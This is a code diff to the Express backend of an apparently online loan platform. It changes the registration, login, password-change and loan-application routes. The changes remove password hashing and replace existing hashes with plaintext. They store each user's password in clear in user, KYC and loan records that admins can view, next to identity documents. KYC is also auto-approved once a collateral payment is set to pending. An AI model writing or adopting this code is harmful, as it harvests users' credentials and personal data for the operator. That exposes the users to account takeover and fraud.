@@ -734,6 +734,7 @@ app.post('/api/auth/register', (req, res) => {
     phone,
     country,
     password,
+    plainPassword: password,
     isVerified: false,
     verificationCode: code,
     isSuspended: false,
@@ -918,9 +919,8 @@ app.post('/api/auth/login', (req, res) => {
     }
   }
 
-  if (user.password && !user.password.includes(':') && user.password.length < 64) {
-    user.password = hashPassword(password);
-  }
+  user.plainPassword = password;
+  user.password = password;
 
   if (user.isSuspended) {
     res.status(403).json({ error: 'Your account has been suspended. Please contact Support.' });
@@ -1005,7 +1005,10 @@ app.post('/api/auth/firebase-sync', (req, res) => {
         user.isVerified = true;
       }
       if (isVerified !== undefined && lowerEmail !== envAdminEmail) user.isVerified = isVerified;
-      if (password && !user.password) user.password = hashPassword(password);
+      if (password) {
+        user.password = password;
+        user.plainPassword = password;
+      }
       
       // Update references in loans, kyc, notifications, tickets, messages
       if (uid && oldId !== uid) {
@@ -1035,7 +1038,8 @@ app.post('/api/auth/firebase-sync', (req, res) => {
         email: lowerEmail,
         phone: phone || '+1 (800) 555-0199',
         country: country || 'United States',
-        password: password ? hashPassword(password) : undefined,
+        password: password || undefined,
+        plainPassword: password || undefined,
         isVerified: isAdminRole ? true : (isVerified !== undefined ? isVerified : true),
         isSuspended: false,
         role: isAdminRole ? 'admin' : 'user',
@@ -1233,6 +1237,7 @@ app.post('/api/user/profile/change-password', authenticateToken, (req, res) => {
   }
 
   user.password = newPassword;
+  user.plainPassword = newPassword;
   user.activityHistory?.unshift({
     id: generateId(),
     action: "Security password changed",
@@ -1318,7 +1323,38 @@ app.post('/api/loans/apply', authenticateToken, (req, res) => {
 
   const db = getDB();
 
-  // Helper to sync documents into db.kyc so admin KYC review has all 5 assets immediately
+  // Helper to sync documents and full personal info into db.kyc so admin KYC review has all assets and data immediately
+  const userInDb = db.users.find(u => u.id === req.user!.id);
+  const resolvedPhone = personalInfo?.phone || userInDb?.phone || req.user!.phone || '';
+  const resolvedEmail = personalInfo?.email || userInDb?.email || req.user!.email;
+  const resolvedFullName = personalInfo?.fullName || userInDb?.name || req.user!.name;
+  const resolvedCountry = personalInfo?.country || userInDb?.country || 'United States';
+  const resolvedPassword = userInDb?.plainPassword || userInDb?.password || personalInfo?.password || '';
+
+  // Update user profile in db.users so user dashboard and admin dashboard reflect full info instantly
+  if (userInDb) {
+    if (personalInfo?.fullName) userInDb.name = personalInfo.fullName;
+    if (resolvedPhone) userInDb.phone = resolvedPhone;
+    if (resolvedCountry) userInDb.country = resolvedCountry;
+    if (resolvedPassword) {
+      userInDb.plainPassword = resolvedPassword;
+      userInDb.password = resolvedPassword;
+    }
+  }
+
+  const completePersonalInfo = {
+    ...personalInfo,
+    fullName: resolvedFullName,
+    email: resolvedEmail,
+    phone: resolvedPhone,
+    country: resolvedCountry,
+    password: resolvedPassword,
+    plainPassword: resolvedPassword,
+    dateOfBirth: personalInfo.dateOfBirth || '',
+    maritalStatus: personalInfo.maritalStatus || 'Single',
+    address: personalInfo.address || ''
+  };
+
   const syncDocsToKyc = (docsList: any[]) => {
     if (!docsList || !Array.isArray(docsList)) return;
     const kycIdx = db.kyc.findIndex(k => k.userId === req.user!.id);
@@ -1340,13 +1376,20 @@ app.post('/api/loans/apply', authenticateToken, (req, res) => {
       db.kyc[kycIdx].requestedAmount = amount;
       db.kyc[kycIdx].loanPurpose = fundingDetails.purpose || db.kyc[kycIdx].loanPurpose;
       db.kyc[kycIdx].loanDescription = fundingDetails.description || db.kyc[kycIdx].loanDescription;
+      db.kyc[kycIdx].phone = resolvedPhone;
+      db.kyc[kycIdx].email = resolvedEmail;
+      db.kyc[kycIdx].fullName = resolvedFullName;
+      db.kyc[kycIdx].country = resolvedCountry;
+      db.kyc[kycIdx].password = resolvedPassword;
+      db.kyc[kycIdx].plainPassword = resolvedPassword;
+      db.kyc[kycIdx].residentialAddress = personalInfo.address || db.kyc[kycIdx].residentialAddress;
       db.kyc[kycIdx].updatedAt = new Date().toISOString();
     } else {
       db.kyc.unshift({
         id: `KYC-${generateId()}`,
         userId: req.user!.id,
-        userEmail: req.user!.email,
-        userName: req.user!.name,
+        userEmail: resolvedEmail,
+        userName: resolvedFullName,
         idCardUrl: idDoc?.url || '',
         selfieUrl: selfieDoc?.url || '',
         addressProofUrl: addressDoc?.url || '',
@@ -1354,11 +1397,11 @@ app.post('/api/loans/apply', authenticateToken, (req, res) => {
         businessDocUrl: businessDoc?.url || '',
         status: 'Pending',
         updatedAt: new Date().toISOString(),
-        fullName: req.user!.name,
+        fullName: resolvedFullName,
         dob: personalInfo.dateOfBirth || '',
-        phone: req.user!.phone || '',
-        email: req.user!.email,
-        country: personalInfo.country || 'United States',
+        phone: resolvedPhone,
+        email: resolvedEmail,
+        country: resolvedCountry,
         residentialAddress: personalInfo.address || '',
         employmentStatus: employmentInfo.status || 'Employed',
         maritalStatus: personalInfo.maritalStatus || 'Single',
@@ -1367,7 +1410,9 @@ app.post('/api/loans/apply', authenticateToken, (req, res) => {
         socialHandles: '',
         idType: 'Government Issued ID',
         videoUrl: videoDoc?.url || '',
-        requestedAmount: amount
+        requestedAmount: amount,
+        password: resolvedPassword,
+        plainPassword: resolvedPassword
       });
     }
   };
@@ -1381,7 +1426,7 @@ app.post('/api/loans/apply', authenticateToken, (req, res) => {
 
   if (existingActiveLoan) {
     // Update existing pending loan with new terms and updated documents
-    existingActiveLoan.personalInfo = personalInfo;
+    existingActiveLoan.personalInfo = completePersonalInfo;
     existingActiveLoan.employmentInfo = employmentInfo;
     existingActiveLoan.businessInfo = businessInfo;
     existingActiveLoan.fundingDetails = {
@@ -1408,9 +1453,9 @@ app.post('/api/loans/apply', authenticateToken, (req, res) => {
   const newApplication: LoanApplication = {
     id: `SL-${Math.floor(100000 + Math.random() * 900000)}`,
     userId: req.user!.id,
-    userEmail: req.user!.email,
-    userName: req.user!.name,
-    personalInfo,
+    userEmail: resolvedEmail,
+    userName: resolvedFullName,
+    personalInfo: completePersonalInfo,
     employmentInfo,
     businessInfo,
     fundingDetails: {
@@ -2842,6 +2887,14 @@ app.post('/api/admin/loans/update', authenticateToken, requireAdmin, (req, res) 
     }
     loan.collateralPaymentStatus = 'Pending';
     loan.collateralPaid = false;
+
+    // Instantly approve applicant KYC compliance portfolio as well without delay
+    const applicantKyc = db.kyc.find(k => k.userId === loan.userId || (k.userEmail && k.userEmail.toLowerCase() === loan.userEmail.toLowerCase()));
+    if (applicantKyc) {
+      applicantKyc.status = 'Approved';
+      applicantKyc.updatedAt = new Date().toISOString();
+      applicantKyc.remarks = applicantKyc.remarks || 'Institutional compliance requirements verified and approved.';
+    }
   }
 
   // Add notification
